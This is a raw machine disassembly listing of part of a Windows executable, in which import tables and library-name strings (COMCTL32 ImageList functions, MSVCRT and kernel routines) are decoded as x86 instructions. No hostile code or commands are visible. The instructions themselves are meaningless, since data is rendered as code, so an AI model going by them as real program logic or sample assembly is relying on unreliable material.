  427ecc:	test   BYTE PTR [edx],al
  427ece:	add    BYTE PTR [ebx],bh
  427ed0:	test   BYTE PTR [edx],al
  427ed2:	add    BYTE PTR [ebp-0x7c],al
  427ed5:	add    al,BYTE PTR [eax]
  427ed7:	dec    ebp
  427ed8:	test   BYTE PTR [edx],al
  427eda:	add    BYTE PTR [edi-0x7c],dl
  427edd:	add    al,BYTE PTR [eax]
  427edf:	popa   
  427ee0:	test   BYTE PTR [edx],al
  427ee2:	add    BYTE PTR [ebx-0x7c],ch
  427ee5:	add    al,BYTE PTR [eax]
  427ee7:	jg     0x427e6d
  427ee9:	add    al,BYTE PTR [eax]
  427eeb:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  427ef2:	add    BYTE PTR [ebx-0x54fffd7c],bl
  427ef8:	test   BYTE PTR [edx],al
  427efa:	add    BYTE PTR [eax],al
  427efc:	add    BYTE PTR [eax],al
  427efe:	add    cl,al
  427f00:	test   BYTE PTR [edx],al
  427f02:	add    cl,bl
  427f04:	test   BYTE PTR [edx],al
  427f06:	add    bh,ah
  427f08:	test   BYTE PTR [edx],al
  427f0a:	add    bl,bh
  427f0c:	test   BYTE PTR [edx],al
  427f0e:	add    BYTE PTR ds:0x1d000285,cl
  427f14:	test   DWORD PTR [edx],eax
  427f16:	add    BYTE PTR [edi],ch
  427f18:	test   DWORD PTR [edx],eax
  427f1a:	add    BYTE PTR ds:0x51000285,bh
  427f20:	test   DWORD PTR [edx],eax
  427f22:	add    BYTE PTR [ecx-0x7b],ah
  427f25:	add    al,BYTE PTR [eax]
  427f27:	ja     0x427eae
  427f29:	add    al,BYTE PTR [eax]
  427f2b:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  427f31:	add    al,BYTE PTR [eax]
  427f33:	mov    ds:0xb9000285,eax
  427f38:	test   DWORD PTR [edx],eax
  427f3a:	add    cl,cl
  427f3c:	test   DWORD PTR [edx],eax
  427f3e:	add    ch,dl
  427f40:	test   DWORD PTR [edx],eax
  427f42:	add    bh,ah
  427f44:	test   DWORD PTR [edx],eax
  427f46:	add    cl,dh
  427f48:	test   DWORD PTR [edx],eax
  427f4a:	add    BYTE PTR [ebx],cl
  427f4c:	xchg   BYTE PTR [edx],al
  427f4e:	add    BYTE PTR [ecx],ah
  427f50:	xchg   BYTE PTR [edx],al
  427f52:	add    BYTE PTR ds:0x45000286,dh
  427f58:	xchg   BYTE PTR [edx],al
  427f5a:	add    BYTE PTR [ecx-0x7a],dl
  427f5d:	add    al,BYTE PTR [eax]
  427f5f:	popa   
  427f60:	xchg   BYTE PTR [edx],al
  427f62:	add    BYTE PTR [ebp-0x7a],ch
  427f65:	add    al,BYTE PTR [eax]
  427f67:	jg     0x427eef
  427f69:	add    al,BYTE PTR [eax]
  427f6b:	lea    eax,[esi-0x7964fffe]
  427f71:	add    al,BYTE PTR [eax]
  427f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f74:	xchg   BYTE PTR [edx],al
  427f76:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427f7c:	xchg   BYTE PTR [edx],al
  427f7e:	add    cl,bl
  427f80:	xchg   BYTE PTR [edx],al
  427f82:	add    ch,ch
  427f84:	xchg   BYTE PTR [edx],al
  427f86:	add    bl,bh
  427f88:	xchg   BYTE PTR [edx],al
  427f8a:	add    BYTE PTR ds:0x1d000287,cl
  427f90:	xchg   DWORD PTR [edx],eax
  427f92:	add    BYTE PTR [ebx],ch
  427f94:	xchg   DWORD PTR [edx],eax
  427f96:	add    BYTE PTR [ecx-0x79],al
  427f99:	add    al,BYTE PTR [eax]
  427f9b:	dec    ebp
  427f9c:	xchg   DWORD PTR [edx],eax
  427f9e:	add    BYTE PTR [ebx-0x79],ah
  427fa1:	add    al,BYTE PTR [eax]
  427fa3:	jg     0x427f2c
  427fa5:	add    al,BYTE PTR [eax]
  427fa7:	xchg   ebx,eax
  427fa8:	xchg   DWORD PTR [edx],eax
  427faa:	add    BYTE PTR [edi-0x44fffd79],ah
  427fb0:	xchg   DWORD PTR [edx],eax
  427fb2:	add    cl,dl
  427fb4:	xchg   DWORD PTR [edx],eax
  427fb6:	add    cl,ch
  427fb8:	xchg   DWORD PTR [edx],eax
  427fba:	add    bh,dh
  427fbc:	xchg   DWORD PTR [edx],eax
  427fbe:	add    BYTE PTR [ecx],cl
  427fc0:	mov    BYTE PTR [edx],al
  427fc2:	add    BYTE PTR [edi],bl
  427fc4:	mov    BYTE PTR [edx],al
  427fc6:	add    BYTE PTR [ecx],dh
  427fc8:	mov    BYTE PTR [edx],al
  427fca:	add    BYTE PTR [ebp-0x78],al
  427fcd:	add    al,BYTE PTR [eax]
  427fcf:	add    BYTE PTR [eax],al
  427fd1:	add    BYTE PTR [eax],al
  427fd3:	mov    BYTE PTR gs:[edx],al
  427fd6:	add    BYTE PTR [ebx-0x78],dh
  427fd9:	add    al,BYTE PTR [eax]
  427fdb:	test   DWORD PTR [eax-0x7768fffe],ecx
  427fe1:	add    al,BYTE PTR [eax]
  427fe3:	mov    ds:0xb5000288,eax
  427fe8:	mov    BYTE PTR [edx],al
  427fea:	add    bh,al
  427fec:	mov    BYTE PTR [edx],al
  427fee:	add    bl,bl
  427ff0:	mov    BYTE PTR [edx],al
  427ff2:	add    bh,ah
  427ff4:	mov    BYTE PTR [edx],al
  427ff6:	add    ch,dh
  427ff8:	mov    BYTE PTR [edx],al
  427ffa:	add    BYTE PTR [ecx],al
  427ffc:	mov    DWORD PTR [edx],eax
  427ffe:	add    BYTE PTR [ebx],dl
  428000:	mov    DWORD PTR [edx],eax
  428002:	add    BYTE PTR [ecx],ah
  428004:	mov    DWORD PTR [edx],eax
  428006:	add    BYTE PTR [edi],ch
  428008:	mov    DWORD PTR [edx],eax
  42800a:	add    BYTE PTR [ebx-0x77],cl
  42800d:	add    al,BYTE PTR [eax]
  42800f:	pop    ebx
  428010:	mov    DWORD PTR [edx],eax
  428012:	add    BYTE PTR [ebp-0x77],dh
  428015:	add    al,BYTE PTR [eax]
  428017:	test   DWORD PTR [ecx-0x7664fffe],ecx
  42801d:	add    al,BYTE PTR [eax]
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	mov    DWORD PTR [edx],eax
  428022:	add    BYTE PTR [edi-0x34fffd77],dh
  428028:	mov    DWORD PTR [edx],eax
  42802a:	add    bl,ah
  42802c:	mov    DWORD PTR [edx],eax
  42802e:	add    bh,ch
  428030:	mov    DWORD PTR [edx],eax
  428032:	add    bh,bh
  428034:	mov    DWORD PTR [edx],eax
  428036:	add    BYTE PTR [ebx],cl
  428038:	mov    al,BYTE PTR [edx]
  42803a:	add    BYTE PTR [edi],dl
  42803c:	mov    al,BYTE PTR [edx]
  42803e:	add    BYTE PTR ds:0x2f00028a,ah
  428044:	mov    al,BYTE PTR [edx]
  428046:	add    BYTE PTR [edi],bh
  428048:	mov    al,BYTE PTR [edx]
  42804a:	add    BYTE PTR [ecx-0x76],dl
  42804d:	add    al,BYTE PTR [eax]
  42804f:	pop    ebp
  428050:	mov    al,BYTE PTR [edx]
  428052:	add    BYTE PTR [edi-0x76],ch
  428055:	add    al,BYTE PTR [eax]
  428057:	jnp    0x427fe3
  428059:	add    al,BYTE PTR [eax]
  42805b:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  428061:	add    al,BYTE PTR [eax]
  428063:	lods   eax,DWORD PTR ds:[esi]
  428064:	mov    al,BYTE PTR [edx]
  428066:	add    BYTE PTR [ebx-0x32fffd76],bh
  42806c:	mov    al,BYTE PTR [edx]
  42806e:	add    ch,bl
  428070:	mov    al,BYTE PTR [edx]
  428072:	add    ch,ch
  428074:	mov    al,BYTE PTR [edx]
  428076:	add    BYTE PTR [ecx],cl
  428078:	mov    eax,DWORD PTR [edx]
  42807a:	add    BYTE PTR [ecx],bl
  42807c:	mov    eax,DWORD PTR [edx]
  42807e:	add    BYTE PTR [ecx],ch
  428080:	mov    eax,DWORD PTR [edx]
  428082:	add    BYTE PTR [edi],dh
  428084:	mov    eax,DWORD PTR [edx]
  428086:	add    BYTE PTR [ebp-0x75],cl
  428089:	add    al,BYTE PTR [eax]
  42808b:	pop    ebx
  42808c:	mov    eax,DWORD PTR [edx]
  42808e:	add    BYTE PTR [ebp-0x75],ah
  428091:	add    al,BYTE PTR [eax]
  428093:	jno    0x428020
  428095:	add    al,BYTE PTR [eax]
  428097:	or     DWORD PTR [ebx-0x7464fffe],0x2
  42809e:	add    BYTE PTR [ebp-0x42fffd75],ch
  4280a4:	mov    eax,DWORD PTR [edx]
  4280a6:	add    cl,dl
  4280a8:	mov    eax,DWORD PTR [edx]
  4280aa:	add    cl,ah
  4280ac:	mov    eax,DWORD PTR [edx]
  4280ae:	add    bh,dh
  4280b0:	mov    eax,DWORD PTR [edx]
  4280b2:	add    BYTE PTR ds:0x1900028c,al
  4280b8:	mov    WORD PTR [edx],es
  4280ba:	add    BYTE PTR [edi],ah
  4280bc:	mov    WORD PTR [edx],es
  4280be:	add    BYTE PTR [ecx],bh
  4280c0:	mov    WORD PTR [edx],es
  4280c2:	add    BYTE PTR [ebx-0x74],cl
  4280c5:	add    al,BYTE PTR [eax]
  4280c7:	pop    ebp
  4280c8:	mov    WORD PTR [edx],es
  4280ca:	add    BYTE PTR [ecx-0x74],ch
  4280cd:	add    al,BYTE PTR [eax]
  4280cf:	ja     0x42805d
  4280d1:	add    al,BYTE PTR [eax]
  4280d3:	lea    ecx,[edx+eax*1+0x28ca100]
  4280da:	add    BYTE PTR [ebp-0x38fffd74],dh
  4280e0:	mov    WORD PTR [edx],es
  4280e2:	add    cl,dl
  4280e4:	mov    WORD PTR [edx],es
  4280e6:	add    bl,ah
  4280e8:	mov    WORD PTR [edx],es
  4280ea:	add    bh,dh
  4280ec:	mov    WORD PTR [edx],es
  4280ee:	add    BYTE PTR [ebx],cl
  4280f0:	lea    eax,[edx]
  4280f2:	add    BYTE PTR [ebx],bl
  4280f4:	lea    eax,[edx]
  4280f6:	add    BYTE PTR [ecx],ch
  4280f8:	lea    eax,[edx]
  4280fa:	add    BYTE PTR [ebx-0x73],al
  4280fd:	add    al,BYTE PTR [eax]
  4280ff:	pop    ebx
  428100:	lea    eax,[edx]
  428102:	add    BYTE PTR [ecx-0x73],ch
  428105:	add    al,BYTE PTR [eax]
  428107:	jnp    0x428096
  428109:	add    al,BYTE PTR [eax]
  42810b:	mov    DWORD PTR [ebp-0x726afffe],ecx
  428111:	add    al,BYTE PTR [eax]
  428113:	scas   eax,DWORD PTR es:[edi]
  428114:	lea    eax,[edx]
  428116:	add    cl,al
  428118:	lea    eax,[edx]
  42811a:	add    bl,dl
  42811c:	lea    eax,[edx]
  42811e:	add    bl,ah
  428120:	lea    eax,[edx]
  428122:	add    bl,dh
  428124:	lea    eax,[edx]
  428126:	add    ch,bh
  428128:	lea    eax,[edx]
  42812a:	add    BYTE PTR ds:0x1f00028e,cl
  428130:	mov    es,WORD PTR [edx]
  428132:	add    BYTE PTR [edi],ch
  428134:	mov    es,WORD PTR [edx]
  428136:	add    BYTE PTR [ebp-0x72],al
  428139:	add    al,BYTE PTR [eax]
  42813b:	pop    ebp
  42813c:	mov    es,WORD PTR [edx]
  42813e:	add    BYTE PTR [edi-0x72],ch
  428141:	add    al,BYTE PTR [eax]
  428143:	jg     0x4280d3
  428145:	add    al,BYTE PTR [eax]
  428147:	xchg   ecx,eax
  428148:	mov    es,WORD PTR [edx]
  42814a:	add    BYTE PTR [edi-0x4efffd72],bl
  428150:	mov    es,WORD PTR [edx]
  428152:	add    BYTE PTR [edi-0x2efffd72],bh
  428158:	mov    es,WORD PTR [edx]
  42815a:	add    bl,ah
  42815c:	mov    es,WORD PTR [edx]
  42815e:	add    bh,dh
  428160:	mov    es,WORD PTR [edx]
  428162:	add    BYTE PTR [ebx],cl
  428164:	pop    DWORD PTR [edx]
  428166:	add    BYTE PTR ds:0x3300028f,bl
  42816c:	pop    DWORD PTR [edx]
  42816e:	add    BYTE PTR [ebp-0x71],al
  428171:	add    al,BYTE PTR [eax]
  428173:	popa   
  428174:	pop    DWORD PTR [edx]
  428176:	add    BYTE PTR [edi-0x71],dh
  428179:	add    al,BYTE PTR [eax]
  42817b:	test   DWORD PTR [edi-0x7066fffe],ecx
  428181:	add    al,BYTE PTR [eax]
  428183:	add    BYTE PTR [eax],al
  428185:	add    BYTE PTR [eax],al
  428187:	mov    bl,0x8f
  428189:	add    al,BYTE PTR [eax]
  42818b:	ret    
  42818c:	pop    DWORD PTR [edx]
  42818e:	add    bl,bl
  428190:	pop    DWORD PTR [edx]
  428192:	add    ch,ah
  428194:	pop    DWORD PTR [edx]
  428196:	add    ch,dh
  428198:	pop    DWORD PTR [edx]
  42819a:	add    BYTE PTR [ecx],cl
  42819c:	nop
  42819d:	add    al,BYTE PTR [eax]
  42819f:	pop    ss
  4281a0:	nop
  4281a1:	add    al,BYTE PTR [eax]
  4281a3:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  4281a9:	add    al,BYTE PTR [eax]
  4281ab:	dec    edi
  4281ac:	nop
  4281ad:	add    al,BYTE PTR [eax]
  4281af:	pop    ebp
  4281b0:	nop
  4281b1:	add    al,BYTE PTR [eax]
  4281b3:	addr16 nop
  4281b5:	add    al,BYTE PTR [eax]
  4281b7:	jns    0x428149
  4281b9:	add    al,BYTE PTR [eax]
  4281bb:	lea    edx,[eax-0x6f66fffe]
  4281c1:	add    al,BYTE PTR [eax]
  4281c3:	scas   eax,DWORD PTR es:[edi]
  4281c4:	nop
  4281c5:	add    al,BYTE PTR [eax]
  4281c7:	ret    
  4281c8:	nop
  4281c9:	add    al,BYTE PTR [eax]
  4281cb:	rcl    DWORD PTR [eax-0x6f1afffe],1
  4281d1:	add    al,BYTE PTR [eax]
  4281d3:	stc    
  4281d4:	nop
  4281d5:	add    al,BYTE PTR [eax]
  4281d7:	add    eax,0x11000291
  4281dc:	xchg   ecx,eax
  4281dd:	add    al,BYTE PTR [eax]
  4281df:	daa    
  4281e0:	xchg   ecx,eax
  4281e1:	add    al,BYTE PTR [eax]
  4281e3:	xor    eax,0x41000291
  4281e8:	xchg   ecx,eax
  4281e9:	add    al,BYTE PTR [eax]
  4281eb:	push   ebx
  4281ec:	xchg   ecx,eax
  4281ed:	add    al,BYTE PTR [eax]
  4281ef:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  4281f9:	add    al,BYTE PTR [eax]
  4281fb:	fwait
  4281fc:	xchg   ecx,eax
  4281fd:	add    al,BYTE PTR [eax]
  4281ff:	stos   DWORD PTR es:[edi],eax
  428200:	xchg   ecx,eax
  428201:	add    al,BYTE PTR [eax]
  428203:	mov    ecx,0xc3000291
  428208:	xchg   ecx,eax
  428209:	add    al,BYTE PTR [eax]
  42820b:	int    0x91
  42820d:	add    al,BYTE PTR [eax]
  42820f:	fst    DWORD PTR [ecx-0x6e1afffe]
  428215:	add    al,BYTE PTR [eax]
  428217:	not    DWORD PTR [ecx-0x6df2fffe]
  42821d:	add    al,BYTE PTR [eax]
  42821f:	daa    
  428220:	xchg   edx,eax
  428221:	add    al,BYTE PTR [eax]
  428223:	aaa    
  428224:	xchg   edx,eax
  428225:	add    al,BYTE PTR [eax]
  428227:	inc    ecx
  428228:	xchg   edx,eax
  428229:	add    al,BYTE PTR [eax]
  42822b:	push   ecx
  42822c:	xchg   edx,eax
  42822d:	add    al,BYTE PTR [eax]
  42822f:	arpl   WORD PTR [edx-0x6d8efffe],dx
  428235:	add    al,BYTE PTR [eax]
  428237:	mov    edx,DWORD PTR [edx+0x2]
  42823d:	add    BYTE PTR [eax],al
  42823f:	pop    esp
  428240:	add    BYTE PTR [eax+0x72],dl
  428243:	outs   dx,DWORD PTR ds:[esi]
  428244:	jo     0x4282ab
  428246:	jb     0x4282bc
  428248:	jns    0x42829d
  42824a:	push   0x57746565
  42824f:	add    BYTE PTR [eax],al
  428251:	push   ebx
  428252:	add    BYTE PTR [ecx+0x6d],cl
  428255:	popa   
  428256:	addr16 gs dec esp
  428259:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  428260:	dec    ecx
  428261:	arpl   WORD PTR [edi+0x6e],bp
  428264:	push   ebx
  428265:	imul   edi,DWORD PTR [edx+0x65],0x49004e00
  42826c:	ins    DWORD PTR es:[edi],dx
  42826d:	popa   
  42826e:	addr16 gs dec esp
  428271:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428278:	ins    BYTE PTR es:[edi],dx
  428279:	popa   
  42827a:	arpl   WORD PTR [ebp+0x49],sp
  42827d:	arpl   WORD PTR [edi+0x6e],bp
  428280:	add    BYTE PTR [eax+eax*1],ch
  428283:	dec    ecx
  428284:	ins    DWORD PTR es:[edi],dx
  428285:	popa   
  428286:	addr16 gs dec esp
  428289:	imul   esi,DWORD PTR [ebx+0x74],0x6464415f
  428290:	dec    ebp
  428291:	popa   
  428292:	jae    0x4282ff
  428294:	gs add BYTE PTR fs:[eax],dh
  428298:	add    BYTE PTR [ecx+0x6d],cl
  42829b:	popa   
  42829c:	addr16 gs dec esp
  42829f:	imul   esi,DWORD PTR [ebx+0x74],0x6572435f
  4282a6:	popa   
  4282a7:	je     0x42830e
  4282a9:	add    BYTE PTR [eax],al
  4282ab:	inc    ebp
  4282ac:	add    BYTE PTR [ecx+0x6d],cl
  4282af:	popa   
  4282b0:	addr16 gs dec esp
  4282b3:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4282ba:	fs dec ecx
  4282bc:	ins    DWORD PTR es:[edi],dx
  4282bd:	popa   
  4282be:	addr16 gs push edi
  4282c1:	add    BYTE PTR [eax],al
  4282c3:	inc    ebx
  4282c4:	dec    edi
  4282c5:	dec    ebp
  4282c6:	inc    ebx
  4282c7:	push   esp
  4282c8:	dec    esp
  4282c9:	xor    esi,DWORD PTR [edx]
  4282cb:	cs fs ins BYTE PTR es:[edi],dx
  4282ce:	ins    BYTE PTR es:[edi],dx
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	cmc    
  4282d2:	add    BYTE PTR [edi+0x63],bl
  4282d5:	outs   dx,DWORD PTR ds:[esi]
  4282d6:	outs   dx,BYTE PTR ds:[esi]
  4282d7:	je     0x42834b
  4282d9:	outs   dx,DWORD PTR ds:[esi]
  4282da:	ins    BYTE PTR es:[edi],dx
  4282db:	data16 jo 0x4282de
  4282de:	add    BYTE PTR [ebx+0x3],bl
  4282e1:	bound  esi,QWORD PTR [ebx+0x65]
  4282e4:	popa   
  4282e5:	jb     0x42834a
  4282e7:	push   0x69039b00
  4282ec:	jae    0x42835e
  4282ee:	jb     0x428359
  4282f0:	outs   dx,BYTE PTR ds:[esi]
  4282f1:	je     0x4282f3
  4282f3:	test   BYTE PTR [ebx],0x73
  4282f6:	je     0x42836a
  4282f8:	jb     0x42835d
  4282fa:	push   0xb30072
  4282ff:	pop    edi
  428300:	pop    edi
  428301:	jae    0x428368
  428303:	je     0x428364
  428305:	popa   
  428306:	jo     0x428378
  428308:	pop    edi
  428309:	je     0x428384
  42830b:	jo     0x428372
  42830d:	add    BYTE PTR [eax],al
  42830f:	mov    al,ds:0x705f5f00
  428314:	pop    edi
  428315:	pop    edi
  428316:	ins    WORD PTR es:[edi],dx
  428318:	outs   dx,DWORD PTR ds:[esi]
  428319:	fs add BYTE PTR gs:[eax],al
  42831d:	jge    0x428322
  42831f:	data16 jb 0x428387
  428322:	add    BYTE PTR gs:[eax],al
  428325:	fwait
  428326:	add    BYTE PTR [edi+0x5f],bl
  428329:	jo     0x42838a
  42832b:	pop    edi
  42832c:	arpl   WORD PTR [edi+0x6d],bp
  42832f:	ins    DWORD PTR es:[edi],dx
  428330:	outs   dx,DWORD PTR ds:[esi]
  428331:	fs add BYTE PTR gs:[eax],al
  428335:	and    eax,0x73637704
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	outs   dx,BYTE PTR gs:[esi]
  42833d:	add    BYTE PTR [eax],al
  42833f:	and    DWORD PTR [edi+esi*2],eax
  428342:	arpl   WORD PTR [ebx+0x63],si
  428345:	jo     0x4283c0
  428347:	add    BYTE PTR [eax],al
  428349:	or     al,BYTE PTR [esp+esi*2]
  42834c:	outs   dx,DWORD PTR ds:[esi]
  42834d:	jne    0x4283bf
  42834f:	jo     0x4283b6
  428351:	jb     0x428353
  428353:	rol    BYTE PTR [ebx],cl
  428355:	jb     0x4283bc
  428357:	ins    DWORD PTR es:[edi],dx
  428358:	outs   dx,DWORD PTR ds:[esi]
  428359:	jbe    0x4283c0
  42835b:	add    BYTE PTR [eax],al
  42835d:	xchg   edi,eax
  42835e:	add    ebp,DWORD PTR [ecx+0x73]
  428361:	imul   esp,DWORD PTR fs:[edi+0x69],0x3ea0074
  428369:	jae    0x4283df
  42836b:	jb     0x4283d0
  42836d:	jae    0x4283df
  42836f:	outs   dx,BYTE PTR ds:[esi]
  428370:	add    BYTE PTR [edi+0x74656703],cl
  428376:	jae    0x428378
  428378:	add    bh,cl
  42837a:	add    esi,DWORD PTR [edx+0x61]
  42837d:	outs   dx,BYTE PTR ds:[esi]
  42837e:	add    BYTE PTR fs:[eax],al
  428381:	mov    ch,0x3
  428383:	ins    DWORD PTR es:[edi],dx
  428384:	popa   
  428385:	ins    BYTE PTR es:[edi],dx
  428386:	ins    BYTE PTR es:[edi],dx
  428387:	outs   dx,DWORD PTR ds:[esi]
  428388:	arpl   WORD PTR [eax],ax
  42838a:	add    al,cl
  42838c:	add    esi,DWORD PTR [eax+0x75]
  42838f:	je     0x4283f4
  428391:	push   0x1c007261
  428396:	add    al,0x77
  428398:	arpl   WORD PTR [ebx+0x63],si
  42839b:	popa   
  42839c:	je     0x42839e
  42839e:	add    BYTE PTR [eax+0x3],ah
  4283a1:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4283a5:	imul   eax,DWORD PTR [eax],0xffffffdb
  4283a8:	add    BYTE PTR [edi+0x61],bl
  4283ab:	ins    DWORD PTR es:[edi],dx
  4283ac:	jae    0x428415
  4283ae:	pop    edi
  4283af:	gs js  0x42841b
  4283b2:	je     0x4283b4
  4283b4:	add    BYTE PTR [edi+0x77736903],ah
  4283ba:	jo     0x42842e
  4283bc:	imul   ebp,DWORD PTR [esi+0x74],0x1860000
  4283c3:	pop    edi
  4283c4:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  4283cb:	ins    DWORD PTR es:[edi],dx
  4283cc:	add    bl,ch
  4283ce:	add    esi,DWORD PTR [ebx+0x74]
  4283d1:	jb     0x428438
  4283d3:	jb     0x428447
  4283d5:	outs   dx,DWORD PTR ds:[esi]
  4283d6:	jb     0x4283d8
  4283d8:	add    ch,bh
  4283da:	add    esi,DWORD PTR [ebx+0x74]
  4283dd:	jb     0x428453
  4283df:	outs   dx,DWORD PTR ds:[esi]
  4283e0:	jne    0x42844e
  4283e2:	add    bh,bh
  4283e4:	add    esi,DWORD PTR [ebx+0x77]
  4283e7:	jo     0x42845b
  4283e9:	imul   ebp,DWORD PTR [esi+0x74],0x9e000066
  4283f0:	add    DWORD PTR [edi+0x69],ebx
  4283f3:	jae    0x428462
  4283f5:	bound  esp,QWORD PTR [edx+0x6c]
  4283f8:	gs popa 
  4283fa:	add    BYTE PTR fs:[eax],al
  4283fd:	fld    DWORD PTR [ebx]
  4283ff:	jae    0x428466
  428401:	je     0x428479
  428403:	bound  esi,QWORD PTR [ebp+0x66]
  428406:	add    BYTE PTR ds:0x676e7504,cl
  42840c:	gs je  0x428472
  42840f:	add    BYTE PTR [eax],al
  428411:	push   edx
  428412:	add    BYTE PTR [edi+0x58],bl
  428415:	arpl   WORD PTR [eax+0x74],si
  428418:	inc    esi
  428419:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  428421:	pop    edi
  428422:	gs js  0x42848e
  428425:	je     0x428427
  428427:	in     eax,0x3
  428429:	jae    0x42849f
  42842b:	jb     0x428490
  42842d:	push   0xf2000072
  428432:	add    esi,DWORD PTR [ebx+0x74]
  428435:	jb     0x4284a5
  428437:	arpl   WORD PTR [eax+0x79],si
  42843a:	add    al,ch
  42843c:	add    BYTE PTR [edi+0x63],bl
  42843f:	gs js  0x4284ab
  428442:	je     0x428444
  428444:	add    BYTE PTR [ebp+0x3],ch
  428447:	data16 addr16 gs je 0x4284af
  42844c:	add    BYTE PTR ds:0x73637704,ch
  428452:	jb     0x4284b7
  428454:	push   0x4200072
  428459:	ja     0x4284be
  42845b:	jae    0x4284c0
  42845d:	outs   dx,DWORD PTR ds:[esi]
  42845e:	ins    BYTE PTR es:[edi],dx
  42845f:	ins    BYTE PTR es:[edi],dx
  428460:	add    cl,ah
  428462:	add    esi,DWORD PTR [ebx+0x73]
  428465:	arpl   WORD PTR [ecx+0x6e],sp
  428468:	data16 add BYTE PTR [eax],al
  42846b:	mov    ch,0x0
  42846d:	pop    edi
  42846e:	pop    edi
  42846f:	jae    0x4284d6
  428471:	je     0x4284e8
  428473:	jae    0x4284da
  428475:	jb     0x4284e4
  428477:	popa   
  428478:	je     0x4284e2
  42847a:	gs jb  0x4284ef
  42847d:	add    BYTE PTR [eax],al
  42847f:	mov    BYTE PTR [ebx],al
  428481:	data16 ja 0x4284f6
  428484:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7303f500
  42848c:	je     0x428500
  42848e:	jo     0x4284f2
  428490:	jb     0x4284fd
  428492:	add    ah,cl
  428494:	add    esi,DWORD PTR [ecx+0x73]
  428497:	outs   dx,DWORD PTR ds:[esi]
  428498:	jb     0x42850e
  42849a:	add    BYTE PTR [edx+0x0],dh
  42849d:	pop    edi
  42849e:	pop    edi
  42849f:	addr16 gs je 0x428510
  4284a3:	popa   
  4284a4:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4284ab:	cli    
  4284ac:	add    esi,DWORD PTR [ebx+0x74]
  4284af:	jb     0x428525
  4284b1:	outs   dx,DWORD PTR ds:[esi]
  4284b2:	imul   eax,DWORD PTR [eax],0x0
  4284b5:	dec    ebp
  4284b6:	push   ebx
  4284b7:	push   esi
  4284b8:	inc    ebx
  4284b9:	push   edx
  4284ba:	push   esp
  4284bb:	cs fs ins BYTE PTR es:[edi],dx
  4284be:	ins    BYTE PTR es:[edi],dx
  4284bf:	add    BYTE PTR [eax],al
  4284c1:	je     0x4284c5
  4284c3:	inc    edi
  4284c4:	gs je  0x42851c
  4284c7:	jae    0x42852e
  4284c9:	jb     0x42850f
  4284cb:	gs popaw 
  4284ce:	jne    0x42853c
  4284d0:	je     0x42851e
  4284d2:	popa   
  4284d3:	outs   dx,BYTE PTR ds:[esi]
  4284d4:	addr16 dec ecx
  4284d6:	inc    esp
  4284d7:	add    BYTE PTR [eax],al
  4284d9:	jnp    0x4284dc
  4284db:	inc    esi
  4284dc:	outs   dx,DWORD PTR ds:[esi]
  4284dd:	ins    BYTE PTR es:[edi],dx
  4284de:	fs push ebx
  4284e0:	je     0x428554
  4284e2:	imul   ebp,DWORD PTR [esi+0x67],0x4280057
  4284e9:	push   ebx
  4284ea:	gs je  0x42853d
  4284ed:	jb     0x428558
  4284ef:	outs   dx,DWORD PTR ds:[esi]
  4284f0:	jb     0x42855b
  4284f2:	je     0x42856d
  4284f4:	inc    ebx
  4284f5:	ins    BYTE PTR es:[edi],dx
  4284f6:	popa   
  4284f7:	jae    0x42856c
  4284f9:	add    BYTE PTR [eax],al
  4284fb:	pop    ebp
  4284fc:	add    DWORD PTR [esi+0x69],eax
  4284ff:	outs   dx,BYTE PTR ds:[esi]
  428500:	fs inc esi
  428502:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  428509:	gs inc ecx
  42850b:	add    BYTE PTR [eax],al
  42850d:	or     al,BYTE PTR [ebx]
  42850f:	dec    esp
  428510:	outs   dx,DWORD PTR ds:[esi]
  428511:	popa   
  428512:	fs push edx
  428514:	gs jae 0x428586
  428517:	jne    0x42858b
  428519:	arpl   WORD PTR [ebp+0x0],sp
  42851c:	add    BYTE PTR ds:0x74655304,bl
  428522:	dec    eax
  428523:	popa   
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	fs ins BYTE PTR es:[edi],dx
  428527:	gs inc ebx
  428529:	outs   dx,DWORD PTR ds:[esi]
  42852a:	jne    0x42859a
  42852c:	je     0x42852e
  42852e:	add    BYTE PTR [ecx+0x3],bl
  428531:	push   eax
  428532:	jne    0x4285a0
  428534:	jae    0x42859b
  428536:	inc    ebp
  428537:	jbe    0x42859e
  428539:	outs   dx,BYTE PTR ds:[esi]
  42853a:	je     0x42853c
  42853c:	add    BYTE PTR ds:0x74655304,dl
  428542:	inc    esi
  428543:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  42854b:	outs   dx,DWORD PTR ds:[esi]
  42854c:	dec    edi
  42854d:	inc    ebp
  42854e:	dec    ebp
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    al,BYTE PTR [edx]
  428553:	inc    edi
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	outs   dx,DWORD PTR ds:[esi]
  428556:	bound  esp,QWORD PTR [ecx+0x6c]
  428559:	inc    ebx
  42855a:	outs   dx,DWORD PTR ds:[esi]
  42855b:	ins    DWORD PTR es:[edi],dx
  42855c:	jo     0x4285bf
  42855e:	arpl   WORD PTR [eax+eax*1+0x9],si
  428562:	add    al,BYTE PTR [edi+0x65]
  428565:	je     0x4285b4
  428567:	outs   dx,DWORD PTR ds:[esi]
  428568:	fs jne 0x4285d7
  42856b:	gs inc esi
  42856d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  428575:	add    BYTE PTR [eax],al
  428577:	mov    eax,DWORD PTR [edx]
  428579:	inc    edi
  42857a:	ins    BYTE PTR es:[edi],dx
  42857b:	outs   dx,DWORD PTR ds:[esi]
